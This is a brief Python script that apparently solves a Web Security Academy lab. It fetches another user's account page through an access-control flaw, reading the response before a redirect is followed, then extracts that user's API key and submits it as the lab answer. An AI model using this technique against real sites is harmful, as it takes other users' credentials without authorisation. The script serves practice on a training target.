import requests, re 
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac4a1fc81fb68e34c0ec70d8006f0065.web-security-academy.net'
url = f'https://{site}'
account_url = f'{url}/my-account?id=carlos'

resp = s.get(account_url, allow_redirects=False)
print(resp.text)
soup = BeautifulSoup(resp.text, 'html.parser')
div_text = soup.find('div', text=re.compile('API')).text
api_key = div_text.split(' ')[4]
url = f'https://{site}/submitSolution'
resp = s.post(url,data={'answer':api_key})
